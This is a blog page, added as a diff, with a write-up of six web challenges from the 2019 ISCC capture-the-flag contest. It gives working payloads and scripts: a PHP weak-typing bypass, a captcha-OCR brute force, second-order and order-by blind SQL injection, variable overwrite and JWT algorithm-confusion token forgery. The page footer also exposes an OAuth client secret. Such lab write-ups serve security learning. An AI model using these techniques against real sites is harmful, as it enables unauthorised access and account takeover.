@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      2019ISCC_web题解 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>2019ISCC_web题解</h2>
+  <p class="post-date">2019-05-28 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB 1"></a>WEB 1</h1><p><img src="./1.png" alt=""><br>观察<code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code>生成过程为<code>chr(value_ascii)</code>拼接。<br>但脚本对<code>value</code>每个<code>Ascii</code>值进行判断<code>&gt;32&amp;&amp;&lt;127</code>则删除value值,直接传入<code>‘w3lc0me_To_ISCC2019’</code>对应<code>ascii</code>将被<code>unset</code>。</p>
+<p>翻看官方手册发现，<code>chr()</code>会对传入数值对<code>256 mod</code>运算，取余。</p>
+<p><img src="./2.png" alt=""><br>利用<code>py</code> 得到 <code>value</code>值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&quot;w3lc0me_To_ISCC2019&quot;</span><br><span class="line">value&#x3D;&#123;&#125;</span><br><span class="line">str1&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,len(username)):</span><br><span class="line">	value[i]&#x3D;ord(username[i])+256</span><br><span class="line">	str1+&#x3D;&quot;value&quot;+&quot;[&quot;+str(i)+&quot;]&#x3D;&quot;+str(value[i])+&quot;&amp;&quot;</span><br><span class="line">print(str1)</span><br></pre></td></tr></table></figure>
+<p><img src="./3.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333</span><br></pre></td></tr></table></figure>
+<p>考察php5弱类型，<code>intval(‘0x91d’)=0,intval(‘0x91d’+1)=2334</code>。php5能将十六进制转为十进制。<br><img src="./4.png" alt=""><br>最终payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.100.83.188:8001&#x2F;?value[0]&#x3D;375&amp;value[1]&#x3D;307&amp;value[2]&#x3D;364&amp;value[3]&#x3D;355&amp;value[4]&#x3D;304&amp;value[5]&#x3D;365&amp;value[6]&#x3D;357&amp;value[7]&#x3D;351&amp;value[8]&#x3D;</span><br><span class="line">340&amp;value[9]&#x3D;367&amp;value[10]&#x3D;351&amp;value[11]&#x3D;329&amp;value[12]&#x3D;339&amp;value[13]&#x3D;323&amp;value[14]&#x3D;323&amp;value[15]&#x3D;306&amp;value[16]&#x3D;304&amp;value[17]&#x3D;305&amp;value[18]&#x3D;313&amp;password&#x3D;0x91d</span><br></pre></td></tr></table></figure>
+<p><img src="./5.png" alt=""></p>
+<h1 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h1><p><img src="./6.png" alt=""></p>
+<p>存在登录框，很明显需要编写py爆破三位密码.验证码图片信息可以在.<code>/vcode.php</code>获取。<br><img src="./7.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">python脚本如下：</span><br><span class="line">import requests</span><br><span class="line">import pytesseract</span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from PIL import Image</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">image_url&#x3D;&quot;http:&#x2F;&#x2F;39.100.83.188:8002&#x2F;vcode.php&quot;</span><br><span class="line">pass_url&#x3D;&quot;http:&#x2F;&#x2F;39.100.83.188:8002&#x2F;login.php&quot;</span><br><span class="line">s&#x3D;requests.Session()</span><br><span class="line">password&#x3D;0</span><br><span class="line"></span><br><span class="line">def getImageCode():</span><br><span class="line">	while True:</span><br><span class="line">		print(&#39;-------开始识别-------&#39;)</span><br><span class="line">		imageURL&#x3D;image_url</span><br><span class="line">		image&#x3D;s.get(url&#x3D;imageURL)</span><br><span class="line">		captcha_img&#x3D;Image.open(BytesIO(image.content))</span><br><span class="line">		imageCode&#x3D;pytesseract.image_to_string(captcha_img)</span><br><span class="line">		print(&#39;[+]验证码识别结果: &#39;,imageCode)</span><br><span class="line">		print(&#39;----------开始d效验-------------&#39;)</span><br><span class="line">		match&#x3D;re.search(r&#39;^[a-z0-9]&#123;4&#125;$&#39;,imageCode)</span><br><span class="line">		if not match:</span><br><span class="line">			print(&#39;[-]验证码:&#39;,imageCode,&#39;校验失败，继续识别&#39;)</span><br><span class="line">		else:</span><br><span class="line">			print(&#39;[+]验证码:&#39;,imageCode,&#39;校验成功&#39;)</span><br><span class="line">			return imageCode</span><br><span class="line"></span><br><span class="line">def guess(password):</span><br><span class="line">	while True:</span><br><span class="line">		passwd&#x3D;&quot;&quot;</span><br><span class="line">		if len(str(password))!&#x3D;3:</span><br><span class="line">			count&#x3D;3-len(str(password))</span><br><span class="line">			for i in range(1,count+1):</span><br><span class="line">				passwd&#x3D;passwd+&quot;0&quot;</span><br><span class="line">		if len(passwd)&#x3D;&#x3D;4:</span><br><span class="line">			break</span><br><span class="line">		passwd&#x3D;passwd+str(password)</span><br><span class="line">		print(&#39;--------------开始猜测密码++++++++++++&#39;)</span><br><span class="line">		imageCode&#x3D;getImageCode()</span><br><span class="line">		data&#x3D;&#123;</span><br><span class="line">			&#39;username&#39;:&#39;admin&#39;,</span><br><span class="line">			&#39;pwd&#39;:passwd,</span><br><span class="line">			&#39;user_code&#39;:imageCode</span><br><span class="line">		&#125;</span><br><span class="line">		g&#x3D;s.post(url&#x3D;pass_url,data&#x3D;data)</span><br><span class="line">		g.encoding&#x3D;g.apparent_encoding</span><br><span class="line">		print(g.text)</span><br><span class="line">		if &#39;验证码错误&#39; in g.text:</span><br><span class="line">			print(g.text)</span><br><span class="line">		elif &#39;密码错误&#39; in g.text:</span><br><span class="line">			print(&#39;密码：&#39;,passwd,&#39;错误&#39;)</span><br><span class="line">			password+&#x3D;1</span><br><span class="line">		else:</span><br><span class="line">			print(&#39;密码：&#39;,passwd,&#39;正确&#39;)</span><br><span class="line">			print(&#39;返回网页结果：&#39;)</span><br><span class="line">			print(g.text)</span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line">guess(password)</span><br><span class="line">password&#x3D;996登录得到flag</span><br></pre></td></tr></table></figure>
+<p><img src="./8.png" alt=""></p>
+<h2 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h2><p>登录抓取POST包，将<code>cookie、capture</code>删除即可绕过验证码。使用burp爆破密码即可<br><img src="./9.png" alt=""></p>
+<h1 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h1><p>考察二次注入：该题能够使用二次注入就是发现修改密码处的显示未转义的username<br>该题与<strong>sqlilabs_less24</strong>相同<br>后端注册代码<br><img src="./10.png" alt=""></p>
+<p>对用户名密码<code>mysql_escape_string</code>转义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册:username:admin’#</span><br><span class="line">password:zxasqw159</span><br></pre></td></tr></table></figure>
+<p>发现插入数据库中的数据并为在单引号前加<code>”\”</code>，存入数据库将单引号吃掉。<br><img src="./11.png" alt=""></p>
+<p>因为登录时候<strong>login.php</strong>会对用户密码转义，无法成功使用<code>”admin’#”</code>以<code>admin</code>帐号登录。<br><img src="./12.png" alt=""></p>
+<p>可以通过修改密码处。使用admin’#帐号进行登录。再进行密码修改，用户名为<code>Session[‘username’]</code>中取出即为<code>”admin’#”</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username:admin’#</span><br><span class="line">curr_pass:zxasqw159</span><br><span class="line">pass:123456</span><br><span class="line">repass:123456</span><br></pre></td></tr></table></figure>
+<p><img src="./13.png" alt=""></p>
+<p>UPDATE处的语句就为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;123456&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;zxasqw159&#39;</span><br></pre></td></tr></table></figure>
+<p>成功将<code>admin</code>密码修改为<code>123456</code><br>登录即可得到Flag<br><img src="./14.png" alt=""><br>解决该题二次注入<br>第一种：插入数据时使用： <code>str_replace(&quot;\\&quot;, &quot;\\\\&quot;);</code><br>第二种：修改密码前对用户名转义</p>
+<h1 id="WEB-4"><a href="#WEB-4" class="headerlink" title="WEB 4"></a>WEB 4</h1><p><img src="./15.png" alt=""><br>parse_str解析url之后存在变量覆盖，构造<code>sha256($hash_key=1)=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:http:&#x2F;&#x2F;39.100.83.188:8066&#x2F;?action&#x3D;auth&amp;hashed_key&#x3D;6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key&#x3D;1</span><br></pre></td></tr></table></figure>
+<p><img src="./16.png" alt=""></p>
+<h1 id="WEB-5"><a href="#WEB-5" class="headerlink" title="WEB 5"></a>WEB 5</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤括号，-，@、and、sleep、extractvalue..字符</span><br></pre></td></tr></table></figure>
+<p>使用<strong>order by 盲注</strong><br><code>order by</code>排序规律是以字节码进行排序<br><img src="./17.png" alt=""></p>
+<p>具体参考<a href="https://p0sec.net/index.php/archives/106/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/106/</a><br>只要每一位字符小于或相等，整体字符串字节码最小的那个字段会排序在第一个位置。<br><img src="./18.png" alt=""><br>按照以上思路，有如下逻辑</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符字节码小于或相等-&gt;回显union select 中第二列内容。</span><br><span class="line">字符字节码不相等-&gt;回显union_373_Tom!</span><br></pre></td></tr></table></figure>
+<p><strong>这里需要注意的是，因为小于也会使得字段排在第一位。</strong><br>所以需要找到最大的每一位使之与union_373_Tom!的密码每一位相同。<br><img src="./19.png" alt=""></p>
+<p>python脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">str1&#x3D;&quot;_&quot;+string.lowercase[::-1]+&#39;987654321&#39;&#x2F;&#x2F;另Ascii值最大排在最前</span><br><span class="line">passwd&#x3D;&#39;&#39;</span><br><span class="line">for j in range(0,32):</span><br><span class="line">	for i in str1:</span><br><span class="line">		data&#x3D;&#123;</span><br><span class="line">			&#39;username&#39;:&#39;union_373_Tom&#39;,</span><br><span class="line">			&#39;password&#39;:&quot;1&#39; or &#39;1&#39;   union select  1,2,&quot;+&quot;&#39;&quot;+passwd+i+&quot;&#39; from admin order by  3,&#39;1&quot;</span><br><span class="line">		&#125;</span><br><span class="line">		header&#x3D;&#123;</span><br><span class="line">			&#39;User-Agent&#39;:&quot;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;74.0.3729.28 Safari&#x2F;537.36 Union.373&quot;</span><br><span class="line">		&#125;</span><br><span class="line">		url&#x3D;&quot;http:&#x2F;&#x2F;39.100.83.188:8054&quot;</span><br><span class="line">		r&#x3D;requests.post(url&#x3D;url,headers&#x3D;header,data&#x3D;data)</span><br><span class="line">		r.encoding&#x3D;&#39;utf-8&#39;</span><br><span class="line">		# print(data)</span><br><span class="line">		if &#39;2!&#39; in r.text:</span><br><span class="line">			passwd&#x3D;passwd+i</span><br><span class="line">			print(passwd)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+<p>运行脚本得到flag<br><img src="./20.png" alt=""></p>
+<h1 id="WEB-6"><a href="#WEB-6" class="headerlink" title="WEB 6"></a>WEB 6</h1><p>登录网页login，服务端response一串json。其中似乎能利用只有token。<br><img src="./21.png" alt=""><br>对token进行解码，发现是使用jwt生成Token。<br><img src="./22.png" alt=""></p>
+<p>访问jwt.io官网得知，base64解码之后的格式是以三部分形式<br>Header头部带有加密方式alg:RS256,类型typ:”JWT”<br><img src="./23.png" alt=""><br>Payload带有用户信息<br><img src="./24.png" alt=""><br>签名字段使用RSASHA256分别对header、payload、secret进行加密。且RSASHA256为非对称加密需要公钥与私钥进行解密<br><img src="./25.png" alt=""><br>查找前端源码，<a href="http://39.100.83.188:8053/static/js/common.js" target="_blank" rel="noopener">http://39.100.83.188:8053/static/js/common.js</a><br>处发现ajax请求，验证头部身份认证。验证成功弹出文件路径。猜测需要构造admin Token进而得到admin的data.links</p>
+<p><img src="./26.png" alt=""><br>在源码底部发现公钥公钥获取方式<br><img src="./27.png" alt=""><br>访问url<a href="http://39.100.83.188:8053/pubkey/7f4986d640c32e7ee1c7a8297b62c4ee得到公钥需要对里面的换行字符”\n”剔除" target="_blank" rel="noopener">http://39.100.83.188:8053/pubkey/7f4986d640c32e7ee1c7a8297b62c4ee得到公钥需要对里面的换行字符”\n”剔除</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk&#x2F;PK</span><br><span class="line">omh6laVF+c3+D+klIjXglj7+&#x2F;wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h</span><br><span class="line">Kk3XQYZeMHov4kW0yuS+5RpFV1Q2gm&#x2F;NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc</span><br><span class="line">IC+LX+9V&#x2F;mpyKe9R3wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>因为服务端发送的token采用RSA256加密方式，需要公钥与私钥。但我们无法获取私钥。猜测后端解密方式是通过HEADER头部alg字段进行解密验证。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python脚本如下</span><br><span class="line">import jwt</span><br><span class="line">import base64</span><br><span class="line">public &#x3D;&quot;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FETVJUek05dWprSG1oNDJhWEcwYUhaay9QSwpvbWg2bGFWRitjMytEK2tsSWpYZ2xqNysvd3huenRuaHlPWnBZeGR0azdGZnBIYTNYaDRQa3BkNVZpdndPdTFoCktrM1hRWVplTUhvdjRrVzB5dVMrNVJwRlYxUTJnbS9OV0dZNTJFYVFtcENORlFiR05pZ1podTk1UjJPb010dWMKSUMrTFgrOVYvbXB5S2U5UjN3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ&#x3D;&#x3D;&quot;</span><br><span class="line">print(jwt.encode(&#123;&quot;name&quot;: &quot;iscc19&quot;,&quot;priv&quot;: &quot;admin&quot;&#125;, key&#x3D;base64.b64decode(public), algorithm&#x3D;&#39;HS256&#39;))</span><br></pre></td></tr></table></figure>
+<p>运行时候需要对algorithms.py中prepare_key中非法字符注释，否则程序报错。<br><img src="./28.png" alt=""><br>运行py获得字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaXNjYzE5IiwicHJpdiI6ImFkbWluIn0.bEza2gXi7_q9qPFTSgbu8wWRpmHqHd1FFa-rJKY_38c</span><br></pre></td></tr></table></figure>
+<p>带入即可获取admin信息<br><img src="./29.png" alt=""><br>访问<a href="http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277获得flag" target="_blank" rel="noopener">http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277获得flag</a><br><img src="./30.png" alt=""></p>
+<p>参考链接：<a href="https://www.anquanke.com/post/id/145540#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540#h2-3</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/">
+        <span class="nav-arrow">← </span>
+        
+          PHP反序列化学习之phar攻击
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
+        
+          2019强网杯web部分题解
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#WEB-1"><span class="toc-nav-text">WEB 1</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#WEB-2"><span class="toc-nav-text">WEB 2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#二解"><span class="toc-nav-text">二解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#WEB-3"><span class="toc-nav-text">WEB 3</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#WEB-4"><span class="toc-nav-text">WEB 4</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#WEB-5"><span class="toc-nav-text">WEB 5</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#WEB-6"><span class="toc-nav-text">WEB 6</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/05/28/2019ISCC-web题解/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "2019ISCC_web题解",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
